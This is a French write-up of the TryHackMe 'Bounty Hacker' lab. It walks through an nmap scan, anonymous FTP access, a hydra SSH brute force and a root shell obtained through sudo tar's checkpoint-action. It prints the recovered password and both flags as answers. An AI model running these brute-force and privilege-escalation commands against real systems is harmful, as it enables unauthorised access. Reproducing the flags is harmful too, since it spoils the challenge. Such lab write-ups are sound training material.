# TryHackMe: Bounty Hacker

**Objectif :** enumerer une machine Linux exposee, profiter d'un acces FTP anonyme pour recuperer une liste de mots de passe et un nom d'utilisateur, bruteforcer SSH, obtenir un shell utilisateur puis elever les privileges via `tar` execute en sudo.

---

## Introduction

**Bounty Hacker** est une room d'initiation tres connue sur TryHackMe. Elle est simple, mais elle couvre une chaine d'attaque tres propre :

- scan reseau
- acces FTP anonyme
- reutilisation d'un fichier comme wordlist
- bruteforce SSH cible
- privilege escalation via GTFOBins

Ce n'est pas une machine "spectaculaire", mais c'est exactement le type de progression qu'il faut savoir documenter proprement.

---

## Task 1: Living up to the title

La room pose plusieurs questions directes. Je reprends chacune d'elles avec le raisonnement complet.

### Question 1: Deploy the machine

Je deploie la machine depuis la plateforme et j'attends qu'elle reponde avant de commencer la reconnaissance.

### Reponse

`Done`

### Question 2: Find open ports on the machine

Je lance un scan Nmap :

```bash
nmap -sC -sV -Pn <IP>
```

Le scan remonte trois ports ouverts :

- `21/tcp` - FTP
- `22/tcp` - SSH
- `80/tcp` - HTTP

### Reponse

**Open ports:** `21,22,80`

---

## Enumeration initiale

Le service HTTP ne revele rien de decisif. La vraie piste vient du FTP, car Nmap indique que la connexion anonyme est autorisee.

Je teste donc :

```bash
ftp <IP>
```

Connexion :

- utilisateur : `anonymous`
- mot de passe : vide ou n'importe quelle valeur

Une fois dans le FTP, je liste les fichiers :

```bash
ls
```

Les deux fichiers interessants sont :

- `task.txt`
- `locks.txt`

Je les recupere :

```bash
get task.txt
get locks.txt
```

---

## Question 3: Who wrote the task list?

J'ouvre `task.txt`.

Le message est signe par :

```text
lin
```

Ce n'est pas seulement une reponse de quiz. C'est aussi un excellent candidat pour un nom d'utilisateur systeme.

### Reponse

**Who wrote the task list?** `lin`

### Question 4: What service can you bruteforce with the text file found?

Le fichier `locks.txt` contient une liste de mots. En recoupant avec les services exposes, le candidat logique pour un bruteforce raisonnable est `SSH`.

### Reponse

**Service to bruteforce:** `ssh`

---

## Exploitation: bruteforce SSH

Je garde l'utilisateur `lin` et j'utilise `locks.txt` comme wordlist.

```bash
hydra -l lin -P locks.txt ssh://<IP>
```

Le bruteforce remonte le mot de passe :

```text
RedDr4gonSynd1cat3
```

### Question 5: What is the users password?

### Reponse

**User password:** `RedDr4gonSynd1cat3`

---

## Acces initial

Avec les identifiants recuperes, je me connecte en SSH :

```bash
ssh lin@<IP>
```

Mot de passe :

```text
RedDr4gonSynd1cat3
```

Une fois connecte, je verifie mon contexte :

```bash
whoami
id
pwd
```

Je lis ensuite le flag utilisateur :

```bash
cat user.txt
```

### Question 6: user.txt

### Reponse

**user.txt:** `THM{CR1M3_SyNd1C4T3}`

---

## Post-exploitation

Je pars sur une enumeration locale classique. Le premier reflexe est :

```bash
sudo -l
```

La sortie montre que l'utilisateur `lin` peut executer :

```text
/bin/tar
```

en tant que root.

Ce droit sudo est exploitable. `tar` fait partie des binaires documentes sur GTFOBins pour obtenir un shell privilegie.

---

## Privilege Escalation

La commande la plus directe est :

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Le principe :

- `tar` commence son traitement
- l'option `--checkpoint=1` declenche une action apres le premier point de controle
- `--checkpoint-action=exec=/bin/sh` force l'execution d'un shell
- comme `tar` tourne via sudo, le shell herite des privileges root

Je confirme :

```bash
whoami
id
```

Puis je lis le flag root :

```bash
cat /root/root.txt
```

### Question 7: root.txt

### Reponse

**root.txt:** `THM{80UN7Y_h4cK3r}`

---

## Resume des reponses de la room

- Deploy the machine `Done`
- Find open ports on the machine `21,22,80`
- Who wrote the task list? `lin`
- What service can you bruteforce with the text file found? `ssh`
- What is the users password? `RedDr4gonSynd1cat3`
- user.txt `THM{CR1M3_SyNd1C4T3}`
- root.txt `THM{80UN7Y_h4cK3r}`

---

## Commandes importantes

### Scan Nmap

```bash
nmap -sC -sV -Pn <IP>
```

Identifie les trois services accessibles et montre que le FTP anonyme est probable.

### Recuperation des fichiers FTP

```bash
ftp <IP>
get task.txt
get locks.txt
```

Fournit le nom d'utilisateur et la wordlist utilises ensuite contre SSH.

### Bruteforce SSH

```bash
hydra -l lin -P locks.txt ssh://<IP>
```

Etape centrale de la compromission initiale.

### Connexion SSH

```bash
ssh lin@<IP>
```

Donne le premier shell interactif sur la machine.

### Enumeration sudo

```bash
sudo -l
```

Revele directement la possibilite d'abuser de `tar`.

### Abus GTFOBins

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Produit un shell root immediat.

---

## Raisonnement complet

Cette room illustre tres bien un schema extremement classique :

1. un service expose laisse un acces anonyme
2. des fichiers internes sont accessibles sans authentification
3. l'un d'eux donne un nom d'utilisateur
4. l'autre sert de base a un bruteforce cible
5. un acces SSH est obtenu
6. un binaire sudo autorise la privilege escalation

Il n'y a aucune etape "magique". Chaque transition repose sur un indice concret.

---

## Conclusion

**Bounty Hacker** reste une excellente room pour debuter proprement. Elle montre qu'un environnement faible n'a pas besoin d'une RCE spectaculaire pour tomber : quelques erreurs d'exposition et un sudo mal pense suffisent largement.

***Auteur*** *: Saad Idrissi*
